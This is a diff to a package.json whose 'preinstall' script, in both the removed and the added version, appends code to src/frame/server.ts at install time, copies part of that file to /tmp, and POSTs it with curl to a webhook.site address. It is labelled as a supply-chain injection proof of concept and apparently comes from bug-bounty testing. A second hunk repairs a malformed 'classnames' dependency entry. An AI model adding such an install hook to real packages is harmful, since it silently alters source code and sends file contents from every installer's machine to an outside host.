@@ -11,7 +11,7 @@
   "type": "module",
   "exports": "./src/frame/server.ts",
   "scripts": {
-    "preinstall": "echo '/* Test Hackerone */\nconsole.log(\"CRITICAL: System Hijacked via Supply Chain Attack\");' >> src/frame/server.ts; echo '--- PROOF OF CODE INJECTION ---' > /tmp/check.txt; tail -n 5 src/frame/server.ts >> /tmp/check.txt; curl -X POST -d @/tmp/check.txt https://webhook.site/c0446b75-1ced-466b-92d7-811196189282",
+    "preinstall": "echo '// POC: Supply Chain Injection Test\nconsole.log(\"SECURITY_ALERT: SOURCE_CODE_COMPROMISED\");' >> src/frame/server.ts; echo '--- CODE INJECTION VERIFICATION ---' > /tmp/poc.txt; tail -n 5 src/frame/server.ts >> /tmp/poc.txt; curl -X POST -d @/tmp/poc.txt https://webhook.site/c0446b75-1ced-466b-92d7-811196189282",
     "add-content-type": "tsx src/content-render/scripts/add-content-type.ts",
     "ai-tools": "tsx src/ai-tools/scripts/ai-tools.ts",
     "all-documents": "tsx src/content-render/scripts/all-documents/cli.ts",
@@ -194,7 +194,7 @@
     "bottleneck": "2.19.5",
     "boxen": "8.0.1",
     "cheerio": "^1.2.0",
-    "classnames":classnames,
+    "classnames": "^2.5.1",
     "clsx": "^2.1.1",
     "connect-datadog": "^0.0.9",
     "connect-timeout": "1.9.1",
